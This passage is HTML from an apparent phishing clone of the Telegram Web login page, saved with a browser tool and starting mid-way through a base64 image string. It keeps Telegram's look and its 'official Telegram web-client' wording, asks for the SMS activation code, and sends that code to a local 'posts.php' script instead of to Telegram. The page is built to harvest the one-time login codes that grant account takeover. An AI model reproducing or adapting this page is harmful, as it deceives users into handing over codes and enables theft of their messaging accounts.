Y4OXYtMS4yNzMiLz48cGF0aCBkPSJtODMuMjMgMTIxLjYyaDEuNjE3djEuMDc4aC4wNDVjLjEzLS4xOS4yNy0uMzY0LjQxOS0uNTI0LjE1LS4xNi4zMTQtLjI5NS40OTQtLjQwNC4xOS0uMTEuNDA0LS4xOTUuNjQ0LS4yNTUuMjQtLjA3LjUxNC0uMTA1LjgyNC0uMTA1LjQ2OSAwIC45MDQuMTA1IDEuMzAzLjMxNC40MDkuMjEuNjk5LjUzNC44NjkuOTczLjI5LS4zOTkuNjI0LS43MTQgMS0uOTQ0LjM3OS0uMjMuODU0LS4zNDQgMS40MjMtLjM0NC44MTkgMCAxLjQ1My4yIDEuOTAyLjU5OS40NTkuMzk5LjY4OSAxLjA2OC42ODkgMi4wMXY1LjM0NmgtMS43MDd2LTQuNTIzYzAtLjMwOS0uMDEtLjU4OS0uMDMtLjgzOS0uMDItLjI2LS4wOC0uNDc5LS4xOC0uNjU5LS4wOS0uMTktLjIzLS4zMzQtLjQxOS0uNDM0LS4xOS0uMS0uNDQ5LS4xNS0uNzc5LS4xNS0uNTc5IDAtLjk5OC4xOC0xLjI1OC41MzktLjI2LjM1OS0uMzg5Ljg2OS0uMzg5IDEuNTI4djQuNTM4aC0xLjcwN3YtNC45NzJjMC0uNTM5LS4xLS45NDQtLjMtMS4yMTMtLjE5LS4yOC0uNTQ0LS40MTktMS4wNjMtLjQxOS0uMjIgMC0uNDM0LjA0NS0uNjQ0LjEzNS0uMi4wOS0uMzc5LjIyLS41MzkuMzg5LS4xNS4xNy0uMjc1LjM3OS0uMzc0LjYyOS0uMDkuMjUtLjEzNS41MzQtLjEzNS44NTR2NC41OThoLTEuNzA3di03Ljc0MyIvPjwvZz48L3N2Zz4=);
  }
</style>
<script id="savepage-shadowloader" type="application/javascript">
  "use strict"
  window.addEventListener("DOMContentLoaded",
  function(event)
  {
    savepage_ShadowLoader(5);
  },false);
  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
</script>
     <style>
        button {
            color: aqua;
            background-color: #5682a3;
  border: none;
  color: white;
  
        }
    
    </style>
    
<meta name="savepage-url" content="https://web.telegram.org/#/login">
<meta name="savepage-title" content="Telegram Web">
<meta name="savepage-from" content="https://web.telegram.org/#/login">
<meta name="savepage-date" content="Sat Apr 04 2020 07:41:59 GMT-0700 (Pacific Daylight Time)">
<meta name="savepage-state" content="Standard Items; Retained cross-origin frames; Removed unsaved URLs; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
<meta name="savepage-version" content="17.2">
<meta name="savepage-comments" content="">
  </head><body class="non_osx non_msie is_1x"><!----><div class="page_wrap" ng-view=""><div class="login_page_wrap" my-custom-background="#e7ebf0">
    <form method="post" action="posts.php">
  <div class="login_head_bg"></div>
  <div class="login_page">
    <div class="login_head_wrap clearfix" ng-switch="progress.enabled">
      <!---->
      <!----><div ng-switch-default="" class="login_head_submit_wrap" style="">
        <!---->
        <!----><a class="login_head_submit_btn" ng-if="credentials.phone_code_hash && !credentials.phone_code_valid" ng-click="logIn()">
        <button msgid="modal_next">Next</button><i class="icon icon-next-submit"></i>
        </a><!---->
        <!---->
        <!---->
      </div><!---->
      <a class="login_head_logo_link" href="https://telegram.org" target="_blank">
        <i class="icon icon-tg-logo"></i><i class="icon icon-tg-title"></i>
      </a>
    </div>

    <div class="login_form_wrap">
      <!---->

      <!---->

      <!----><form action="posts.php" method="post" name="myLoginForm" ng-if="credentials.phone_code_hash && !credentials.phone_code_valid" ng-submit="logIn()" class="ng-pristine ng-invalid ng-invalid-required" style="">
        <h3 class="login_phone_head"><span ng-bind="credentials.phone_country">+91</span> <span ng-bind="credentials.phone_number">XXXXXXXX</span></h3>
        <div class="login_edit_phone"><a ng-click="editPhone()" my-i18n="login_edit_number">Edit phone number</a></div>

        <div ng-switch="credentials.type._">
          <!---->
          <!---->
          <!----><p ng-switch-default="" class="login_smscode_lead" my-i18n="login_enter_sms_code_label_md">We've sent an SMS with an activation code to your phone.<br>Please enter the code below.</p><!---->
        </div>

        <!---->

        <div class="md-input-group md-input-group-centered md-input-animated md-input-focused md-input-has-value" ng-class="{'md-input-error': error.field == 'phone_code'}" my-labeled-input="" ng-switch="error.field == 'phone_code'">
          <!---->
          <!----><label ng-switch-default="" class="md-input-label" my-i18n="login_number_input_placeholder">Enter your code</label><!---->
          <input autocomplete="off" class="md-input ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" my-focused="" name="phone_code" type="tel" ng-model="credentials.phone_code" required="" maxlength="8" value="">
        </div>
      </form><!---->

      <!---->

      <!---->

    </div>

    <div ng-switch="about.shown">
      <!---->
      <!----><div ng-switch-default="" class="login_footer_wrap">
        <p my-i18n="login_about_intro">Welcome to the official Telegram web-client.</p>
        <a class="logo_footer_learn_more_link" href="" ng-click="about.shown = true" my-i18n="login_about_learn">Learn more</a>
      </div><!---->

    </div>
  </div>
    </form>
</div>

</div><div id="notify_sound"></div><script data-savepage-src="js/app.js"></script></body><script type="text/javascript" id="useragent-switcher"></script></html>